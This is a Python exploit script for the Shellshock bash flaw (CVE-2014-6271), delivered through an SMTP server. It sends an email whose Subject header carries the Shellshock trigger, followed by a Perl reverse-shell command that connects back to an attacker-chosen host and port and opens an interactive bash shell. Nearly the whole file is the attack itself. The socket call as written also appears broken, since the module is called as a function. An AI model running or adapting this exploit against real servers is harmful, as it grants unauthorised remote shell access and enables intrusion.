#!/usr/bin/env python3

# Exploit Title:  Shellshock SMTP Exploit
# Modified on: 5/20/2022
# Modified by: grav3m1nd-byte
#
# Originally Developed:
# Date: 10/3/2014
# Exploit Author: fattymcwopr
#
# Vendor Homepage: gnu.org
# Software Link: http://ftp.gnu.org/gnu/bash/
# Version: 4.2.x < 4.2.48
# Tested on: Debian 7 (postfix smtp server w/procmail)
# CVE : 2014-6271

import socket
import sys
import codecs
import argparse


def netFormat(d):
    d += "\r\n"
    return d.encode()
    
parser = argparse.ArgumentParser(description='Shellshock SMTP Exploit')
parser.add_argument('-r', '--RHOST', required=True, type=str,
    help="Remote Host to connect to against its SMTP Service")
parser.add_argument('-rp', '--RPORT', default=25, type=int,
    help="Remote Port SMTP Service")

parser.add_argument('-l', '--LHOST', required=True, type=str,
    help='Local Host to be used for the reverse shell')
parser.add_argument('-lp', '--LPORT', required=True, type=int,
    help='Local Port to listed to for the reverse shell')

parser.add_argument('--TO', required=True, type=str,
    help='Recipient Email Address as validated with the SMTP Service')
parser.add_argument('--FROM', default='nobody', type=str,
    help='Sender email address')

parser.add_argument('-s', '--SHELL', default='/bin/bash -i', 
    type=str, help='Shell types to use in Reverse Shell, Default: Bash (/bin/bash -i)')

args = parser.parse_args()

cmd_arg =  "use Socket;$i=\"{0}\";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));".format(args.LHOST, args.LPORT)
cmd_arg += "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");"
cmd_arg += "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{0}\");};".format(args.SHELL)

cmd = "perl -e '{}'".format(cmd_arg)

#headers = ([
#    "To",
#    "References",
#    "Cc",
#    "Bcc",
#    "From",
#    "Subject",
#    "Date",
#    "Message-ID",
#    "Comments",
#    "Keywords",
#    "Resent-Date",
#    "Resent-From",
#    "Resent-Sender"
#    ])

s = socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((args.RHOST, args.RPORT))

# banner grab
s.recv(2048*4)

data = netFormat("mail from:<{}>".format(args.FROM))
s.send(data)
s.recv(2048*4)

data = netFormat("rcpt to:<{}>".format(args.TO))
s.send(data)
s.recv(2048*4)

data = netFormat("data")
s.send(data)
s.recv(2048*4)

data = b''
# for header in headers:
#     data += netFormat("To: <{}>".format(args.TO))
#     data += netFormat("From: <{}>".format(args.TO))
#     data += netFormat(header + ":() { :; };" + cmd)
data = b''
data += netFormat("To: <{}>".format(args.TO))
data += netFormat("From: <{}>".format(args.TO))
data += netFormat("Subject:() { :; };")
data += netFormat(cmd)

# <CR><LF>.<CR><LF>
data += codecs.decode("0d0a2e0d0a", 'hex')

s.send(data)
s.recv(2048*4)

data = netFormat("quit")
s.send(data)
s.recv(2048*4)
